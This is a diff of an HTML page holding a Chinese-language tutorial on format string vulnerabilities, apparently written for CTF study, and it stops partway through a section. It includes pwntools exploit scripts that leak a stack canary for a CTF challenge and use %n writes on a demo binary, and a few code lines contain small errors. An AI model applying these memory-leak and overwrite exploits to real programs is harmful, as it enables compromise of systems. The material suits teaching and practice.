@@ -1295,12 +1295,59 @@
     原理
   </a>
   
+    <nav class="md-nav" aria-label="原理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    格式化字符串函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    格式化字符串漏洞原理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    例子
+  <a href="#_8" class="md-nav__link">
+    利用
   </a>
+  
+    <nav class="md-nav" aria-label="利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    程序崩溃
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    泄露内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    覆盖内存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1422,12 +1469,59 @@
     原理
   </a>
   
+    <nav class="md-nav" aria-label="原理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    格式化字符串函数
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    格式化字符串漏洞原理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    例子
+  <a href="#_8" class="md-nav__link">
+    利用
   </a>
+  
+    <nav class="md-nav" aria-label="利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    程序崩溃
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    泄露内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    覆盖内存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1451,10 +1545,361 @@
 
 <h1 id="_1">格式化字符串漏洞<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
 <div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
-<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8V2m6.78 1a.69.69 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38-2.5-2.5Z"/></svg></span> 约 12 个字 </p>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8V2m6.78 1a.69.69 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38-2.5-2.5Z"/></svg></span> 约 2000 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span> 115 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3L12.5 13Z"/></svg></span> 预计阅读时间 8 分钟</p>
 </div>
 <h2 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h2 id="_3">例子<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_3">格式化字符串函数<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>接受可变数量的参数，将第一个参数作为格式化字符串，然后根据这个参数来解析其后的参数。通常用于输出信息、调试参数或处理字符串。利用时主要分为三个部分：</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数（可选）</li>
+</ul>
+<h4 id="_4">种类<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<ul>
+<li>输入<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li>输出</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>printf</td>
+<td>输出到 stdout</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td>输出指定的 FILE 流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td>根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td>根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td>输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td>输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td>根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td>根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>setproctitle</td>
+<td>设置 argv</td>
+</tr>
+<tr>
+<td>syslog</td>
+<td>输出日志</td>
+</tr>
+<tr>
+<td>err, verr, warn, vwarn 等</td>
+<td>· · ·</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_5">格式化字符串<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>格式化字符串结构如下
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">%</span><span class="p">[</span><span class="n">parameter</span><span class="p">][</span><span class="n">flags</span><span class="p">][</span><span class="n">field</span><span class="w"> </span><span class="n">width</span><span class="p">][.</span><span class="n">precision</span><span class="p">][</span><span class="n">length</span><span class="p">]</span><span class="n">type</span>
+</code></pre></div></p>
+<ul>
+<li>parameter<ul>
+<li><code>n$</code> 用来说明显示第几个参数，任意一个占位符使用了 parameter ，则其余所有占位符也得使用 parameter</li>
+</ul>
+</li>
+<li>flags<ul>
+<li><code>+</code> 显示有符号数值的符号，缺省忽略正数的 <code>+</code> 。仅适用于数值</li>
+<li>space 若有符号数值输出结果没有正负号或输出 0 个字符，将前缀 1 个空格。若space和 <code>+</code> 同时出现，则忽略 space</li>
+<li><code>-</code> 左对齐。缺省则右对齐</li>
+<li><code>#</code> <ul>
+<li><code>g</code> 不删除尾部 0</li>
+<li><code>f</code> 、<code>e</code>、<code>g</code>，总是输出小数点</li>
+<li><code>o</code>，<code>x</code>，在非零数值前分别输出前缀 0，0x 表示精度</li>
+</ul>
+</li>
+<li><code>0</code> 在左侧以 0 填充以达到 width 参数要求。<code>0</code> 和 <code>-</code> 同时出现则忽略 <code>0</code></li>
+</ul>
+</li>
+<li>field width 输出的最小宽度</li>
+<li>precision 输出的最大长度</li>
+<li>length<ul>
+<li><code>hh</code> 输出一个字节</li>
+<li><code>h</code> 输出一个双字节</li>
+</ul>
+</li>
+<li>type<ul>
+<li><code>d/i</code> 有符号整数</li>
+<li><code>u</code> 无符号整数</li>
+<li><code>x/X</code> 16 进制无符号整数</li>
+<li><code>o</code> 8 进制无符号整数</li>
+<li><code>s</code> 字符串</li>
+<li><code>c</code> 字符</li>
+<li><code>p</code> 打印指针</li>
+<li><code>n</code> 把已经成功输出的字符个数写入对应的整形参数所指向的变量</li>
+<li><code>%</code> 不接受任何 flags，width</li>
+</ul>
+</li>
+</ul>
+<h4 id="_6">参数<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>需要输出的变量</p>
+<h3 id="_7">格式化字符串漏洞原理<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p>格式化字符串函数是根据格式化字符串来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下：</p>
+<p><img alt="fmtstr-stack" src="../assets/fmtstr-stack.png" /></p>
+<p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
+<ul>
+<li>当前字符不是 <code>%</code>，直接输出到相应标准输出。</li>
+<li>当前字符是 <code>%</code>，继续读取下一个字符<ul>
+<li>如果没有字符，报错</li>
+<li>如果下一个字符是 <code>%</code>, 输出 `%</li>
+<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
+</ul>
+</li>
+</ul>
+<p>若我们没有提供参数，则会将格式化字符串地址解析为对应的格式并输出</p>
+<h2 id="_8">利用<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p>格式化字符串拥有三种利用方法：</p>
+<ul>
+<li>使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。</li>
+<li>查看进程内容，根据 %d，%f 输出了栈上的内容。</li>
+<li>覆盖内存</li>
+</ul>
+<h3 id="_9">程序崩溃<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可</p>
+<h3 id="_10">泄露内存<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
+<ul>
+<li>泄露栈内存<ul>
+<li>获取某个变量的值</li>
+<li>获取某个变量对应地址的内存</li>
+</ul>
+</li>
+<li>泄露任意地址内存<ul>
+<li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li>
+<li>盲打，dump 整个程序，获取有用信息。</li>
+</ul>
+</li>
+</ul>
+<h4 id="_11">例子<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
+<p>以 [深育杯 2021]find_flag 为例，先 checksec </p>
+<p><img alt="find_flag-checksec" src="../assets/find_flag-checksec.png" /></p>
+<p>64 位程序，保护全开。丢进ida, 程序中在偏移 <strong>0x122E</strong> 处存在后门，找到关键函数<strong>sub_132F</strong> </p>
+<p><img alt="find_flag-sub_132F" src="../assets/find_flag-sub_132F.png" /></p>
+<p>发现其中存在格式化字符串漏洞和栈溢出漏洞，因此思路如下：</p>
+<ol>
+<li>计算格式化字符串在栈上的 offset</li>
+<li>通过漏洞泄露 rbp-8 处的 canary 和 rbp+8 处的返回地址</li>
+<li>通过返回地址计算程序运行的真实地址</li>
+<li>计算后门指令的真实地址</li>
+<li>利用 ret2text 获得flag</li>
+</ol>
+<p>使用 gdb 调试出 offset，如下：</p>
+<p><img alt="find_flag-offset.png" src="../assets/find_flag-offset.png" /></p>
+<p>canary 和返回地址的在栈上偏移分别为 17 和 19 ，我们构造 <code>%17$p,%19$p</code> 来泄露对应的值，同时可以在 IDA 找到返回地址的偏移地址为 <strong>0x146F</strong>  </p>
+<p><img alt="find_flag-ret_offset.png" src="../assets/find_flag-offset.png" /></p>
+<p>exp 如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node4.anna.nssctf.cn&quot;</span><span class="p">,</span><span class="mi">28516</span><span class="p">)</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="n">payload1</span> <span class="o">=</span> <span class="s2">&quot;%17$p,%19$p&quot;</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;name? &quot;</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">)</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="n">re</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="nb">print</span><span class="p">(</span><span class="o">*</span><span class="n">re</span><span class="p">)</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">:],</span><span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="n">return_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">:],</span><span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;canary:</span><span class="si">%x</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">canary</span><span class="p">)</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;return_address:</span><span class="si">%x</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">return_addr</span><span class="p">)</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="n">base_addr</span> <span class="o">=</span> <span class="n">return_addr</span> <span class="o">-</span> <span class="mh">0x146F</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="n">backdoor_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mh">0x122E</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor_addr</span><span class="p">)</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;else? &quot;</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>运行结果如下：</p>
+<p><img alt="find_flag-flag.png" src="../assets/find_flag-flag.png" /></p>
+<h3 id="_12">覆盖内存<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p>只要变量对应的地址可写，我们就可以利用如下 type 的格式化字符串来修改其对应的数值。</p>
+<ul>
+<li>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
+</ul>
+<p>而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>...[overwrite addr]....%[overwrite offset]$n
+</code></pre></div>
+<p>也可通过 pwntools fmtstr_payload 直接生成，但无论哪个都有如下步骤：</p>
+<ul>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ul>
+<p>下面以 CTF Wiki 的 32 位程序为例</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">123</span><span class="p">,</span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">456</span><span class="p">;</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"> </span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">789</span><span class="p">;</span><span class="w"> </span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"> </span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span><span class="w"> </span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">);</span><span class="w"> </span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w"> </span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;modified c.&quot;</span><span class="p">);</span><span class="w"> </span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;modified a for a small number.&quot;</span><span class="p">);</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">b</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x12345678</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;modified b for a big number!&quot;</span><span class="p">);</span><span class="w"> </span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="p">}</span>
+</code></pre></div>
+<h4 id="_13">覆盖栈内存<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<h5 id="_14">确定覆盖地址<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h5>
+<p>程序直接输出了 c 的地址，这步跳过</p>
+<h5 id="_15">确定相对偏移<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h5>
+<p>用gdb打开，使用的 fmtarg 得到偏移为 6</p>
+<p><img alt="fmtstr-offset2.png" src="../assets/fmtstr-offset2.png" /></p>
+<h5 id="_16">进行覆盖<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h5>
+<p>由于 c 的地址长度为 4 ，构造 payload 如下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">[</span><span class="n">addr</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">c</span><span class="p">]</span><span class="o">%</span><span class="mo">012</span><span class="n">d</span><span class="o">%</span><span class="mi">6</span><span class="n">$n</span>
+</code></pre></div>
+<p>exp：
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="p">)</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./fmtstr&#39;</span><span class="p">)</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">c_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">c_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%12d</span><span class="s1">%6$n&#39;</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></p>
+<p>结果如下：</p>
+<p><img alt="fmtstr-res.png" src="../assets/fmtstr-res.png" /></p>
+<h4 id="_17">覆盖任意地址内存<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<h5 id="_18">覆盖小地址<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h5>
+<p>如果我们需要修改内存为<strong>小于机器字长的数字</strong>，如程序中的 a 需要覆盖为 2。此时不能将地址放在最开头，否则将直接占用 4 或 8 个字长，必然大于 0. 所以我们可以改变地址在 payload 的位置，同时需要修改我们使用的栈上的偏移。例如此题的 payload 构造：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">aa$8</span><span class="o">%</span><span class="n">naa</span><span class="p">[</span><span class="n">addr</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">a</span><span class="p">]</span>
+</code></pre></div>
+<p>在占位符 <code>%8$n</code> 前使用 <code>aa</code> 保证修改的值为 2 ，而 offset 修改为 8 是由于 <code>aa$8</code> 和 <code>%naa</code> 各占了 4 字节，而 <code>aa$8</code> 的偏移为 6，进而推断出 a 的地址在栈上的偏移应该为 8。</p>
+<p>最后 a 的地址<strong>0x804C018</strong>可以在 ida 中找到</p>
+<p>exp：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="p">)</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./fmtstr&#39;</span><span class="p">)</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;aa%8$naa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804C018</span><span class="p">)</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+<p>结果：</p>
+<p><img alt="fmtstr-res2.png" src="../assets/fmtstr-res2.png" /></p>
+<h5 id="_19">覆盖大地址<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h5>
+<p>首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。同时，格式化字符串存在如下两个标志</p>
+<ul>
